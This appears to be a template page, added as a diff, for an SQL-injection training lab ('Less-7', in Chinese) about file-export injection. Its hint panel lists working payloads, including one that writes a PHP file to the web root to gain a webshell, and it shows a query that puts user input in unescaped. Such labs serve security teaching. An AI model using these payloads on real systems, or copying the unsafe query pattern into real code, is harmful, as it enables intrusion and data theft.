@@ -1,0 +1,127 @@
+{% extends "base.html" %}
+
+{% block title %}Less-7 - 文件导出注入 | Python SQLi-Labs{% endblock %}
+
+{% block content %}
+<div class="container mt-4">
+    <div class="row">
+        <div class="col-lg-8">
+            <div class="card">
+                <div class="card-header bg-primary text-white">
+                    <h3>
+                        <i class="fas fa-file-export me-2"></i>
+                        Less-7: GET - 导出文件注入
+                    </h3>
+                </div>
+                <div class="card-body">
+                    <div class="alert alert-info">
+                        <i class="fas fa-info-circle me-2"></i>
+                        <strong>目标：</strong> 学习利用INTO OUTFILE进行数据导出的注入技术。
+                    </div>
+                    
+                    <form method="GET" class="mb-4">
+                        <div class="input-group">
+                            <span class="input-group-text">
+                                <i class="fas fa-search"></i>
+                            </span>
+                            <input type="text" name="id" class="form-control" 
+                                   placeholder="请输入ID值 (例如: 1)" 
+                                   value="{{ id_param }}" required>
+                            <button type="submit" class="btn btn-primary">
+                                <i class="fas fa-play me-1"></i>提交查询
+                            </button>
+                        </div>
+                    </form>
+
+                    {% if id_param %}
+                        <div class="code-display">
+                            <strong>执行的SQL查询：</strong><br>
+                            SELECT * FROM users WHERE id = ('<span class="text-warning">{{ id_param }}</span>') LIMIT 0,1
+                        </div>
+                    {% endif %}
+
+                    {% if message %}
+                        <div class="alert alert-{% if 'error' in message.lower() %}danger{% else %}success{% endif %} mt-3">
+                            <i class="fas fa-{% if 'error' in message.lower() %}exclamation-triangle{% else %}info-circle{% endif %} me-2"></i>
+                            {{ message }}
+                        </div>
+                    {% endif %}
+                </div>
+            </div>
+        </div>
+
+        <div class="col-lg-4">
+            <div class="card">
+                <div class="card-header bg-success text-white">
+                    <h5>
+                        <i class="fas fa-lightbulb me-2"></i>
+                        文件导出提示
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <h6><i class="fas fa-bug me-2 text-danger"></i>漏洞分析</h6>
+                    <p class="small">此关卡可以利用INTO OUTFILE语句将查询结果导出到文件系统。</p>
+                    
+                    <h6><i class="fas fa-tools me-2 text-primary"></i>导出技术</h6>
+                    <ol class="small">
+                        <li>使用 <code>INTO OUTFILE</code> 语句</li>
+                        <li>选择合适的导出路径</li>
+                        <li>构造恶意文件内容</li>
+                        <li>获取Webshell权限</li>
+                    </ol>
+
+                    <h6><i class="fas fa-code me-2 text-info"></i>示例Payload</h6>
+                    <div class="bg-dark text-light p-2 rounded small mb-2">
+                        <code>1') UNION SELECT 1,2,3,4,5 INTO OUTFILE '/tmp/test.txt'--</code>
+                    </div>
+                    <div class="bg-dark text-light p-2 rounded small mb-2">
+                        <code>1') UNION SELECT 1,'&lt;?php phpinfo(); ?&gt;',3,4,5 INTO OUTFILE '/var/www/html/shell.php'--</code>
+                    </div>
+                    <div class="bg-dark text-light p-2 rounded small">
+                        <code>1') UNION SELECT database(),user(),version(),4,5--</code>
+                    </div>
+
+                    <h6 class="mt-3"><i class="fas fa-shield-alt me-2 text-warning"></i>注意事项</h6>
+                    <ul class="small mb-0">
+                        <li>需要文件写入权限</li>
+                        <li>目标路径必须可写</li>
+                        <li>文件不能已存在</li>
+                        <li>注意路径分隔符</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="card mt-3">
+                <div class="card-header bg-warning text-dark">
+                    <h6>
+                        <i class="fas fa-exclamation-triangle me-2"></i>
+                        快速测试
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="d-grid gap-2">
+                        <a href="?id=1" class="btn btn-outline-primary btn-sm">正常查询</a>
+                        <a href="?id=1')" class="btn btn-outline-danger btn-sm">触发错误</a>
+                        <a href="?id=1') AND 1=1--" class="btn btn-outline-success btn-sm">真条件</a>
+                        <a href="?id=1') UNION SELECT 1,2,3,4,5--" class="btn btn-outline-info btn-sm">联合查询</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card mt-3">
+                <div class="card-header bg-danger text-white">
+                    <h6>
+                        <i class="fas fa-exclamation-triangle me-2"></i>
+                        安全警告
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <small class="text-danger">
+                        <strong>警告：</strong> 文件导出功能在此演示环境中已被禁用，以防止安全风险。在真实环境中，此类攻击可能导致严重的安全后果。
+                    </small>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %} 
